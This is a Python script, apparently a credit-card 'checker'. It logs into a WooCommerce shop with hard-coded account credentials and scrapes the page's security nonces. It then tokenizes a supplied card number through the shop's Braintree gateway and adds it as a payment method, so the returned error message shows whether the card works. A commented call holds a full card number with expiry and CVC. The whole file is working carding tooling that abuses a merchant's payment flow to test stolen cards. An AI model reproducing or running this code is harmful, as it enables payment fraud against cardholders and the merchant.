import requests,re
from bs4 import BeautifulSoup
import requests
import base64
import re





def Tele(ccx):
    ccx = ccx.strip()
    
    # Step 1: Parse CC Details
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        print("Invalid card format. Use: '1234567890123456|MM|YY|CVC'")
        return None

    session = requests.Session()


    headers = {
    'authority': 'disciplinedfinancialmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://disciplinedfinancialmanagement.com/login/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    response = session.get('https://disciplinedfinancialmanagement.com/myaccount',  headers=headers)

    headers = {
    'authority': 'disciplinedfinancialmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',   
    'origin': 'https://disciplinedfinancialmanagement.com',
    'referer': 'https://disciplinedfinancialmanagement.com/login/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = {
    'log': 'fabof62361@acedby.com',
    'pwd': 'xitioPass@1999',
    'rememberme': 'forever',
    'submit': '',
    'redirect_to': 'https://disciplinedfinancialmanagement.com/wp-admin/',
    'testcookie': '1',
}

    response = session.post('https://disciplinedfinancialmanagement.com/login/', headers=headers, data=data)




    headers = {
    'authority': 'disciplinedfinancialmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://disciplinedfinancialmanagement.com/my-account/payment-methods/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    response = session.get(
    'https://disciplinedfinancialmanagement.com/my-account/add-payment-method/',
    headers=headers,
)

    html = response.text

# Extract client_token_nonce value from JSON-like snippet
    client_token_nonce_match = re.search(r'"client_token_nonce":"([^"]+)"', html)
    client_token_nonce = client_token_nonce_match.group(1) if   client_token_nonce_match else None

# Extract woocommerce-add-payment-method-nonce from hidden input
    payment_nonce_match = re.search(
    r'<input[^>]+id="woocommerce-add-payment-method-nonce"[^>]+value="([^"]+)"', html)
    payment_nonce = payment_nonce_match.group(1) if payment_nonce_match else None

    print("client_token_nonce:", client_token_nonce)
    print("Add payment nonce:", payment_nonce)






    headers = {
    'authority': 'disciplinedfinancialmanagement.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://disciplinedfinancialmanagement.com',
    'referer': 'https://disciplinedfinancialmanagement.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client_token_nonce,
}

    response = session.post(
    'https://disciplinedfinancialmanagement.com/wp-admin/admin-ajax.php',
    
    headers=headers,
    data=data,
)

    enc = response.json().get('data', '')
    dec = base64.b64decode(enc).decode('utf-8')

    matches = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)

    au = matches[0]
    if matches:
        print("Authorization Fingerprint:", au)
    else:
        print("not found")
    
    


    # Step 2: Tokenize CC using Braintree
    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'unique-session-id'
        },
        'query': '''
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   
                tokenizeCreditCard(input: $input) {     
                    token     
                    creditCard {       
                        bin       
                        brandCode       
                        last4       
                        expirationMonth      
                        expirationYear      
                        binData {         
                            issuingBank         
                            countryOfIssuance         
                        }     
                    }   
                } 
            }
        ''',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    
    if response.status_code != 200:
        print("Braintree Tokenization Failed:", response.status_code, response.text)
        return None

    try:
        data = response.json()
        token = data["data"]["tokenizeCreditCard"]["token"]
        print("Tokenized Card ID:", token)
    except (KeyError, TypeError):
        print("Error: Could not extract token from response.")
        return None

    








    headers = {
    'authority': 'disciplinedfinancialmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',

    'origin': 'https://disciplinedfinancialmanagement.com',
    'referer': 'https://disciplinedfinancialmanagement.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': token,
    'wc_braintree_device_data': '{"correlation_id":"a49ead3c82c5a1f423a01552f1aa87ce"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': payment_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

    response = session.post(
    'https://disciplinedfinancialmanagement.com/my-account/add-payment-method/',
    
    headers=headers,
    data=data,
)


# Extract the full <ul class="woocommerce-error-list woocommerce-error wc-notice">...</ul> block
    match = re.search(
    r'<ul class="woocommerce-error-list woocommerce-error wc-notice"[^>]*?>.*?<li>\s*(.*?)\s*</li>.*?</ul>',
    response.text,
    re.DOTALL
)

    if match:
        return match.group(1).strip()
    else:
        return "No error message found."
    
#Tele("532780698130157|01|2029|657")
    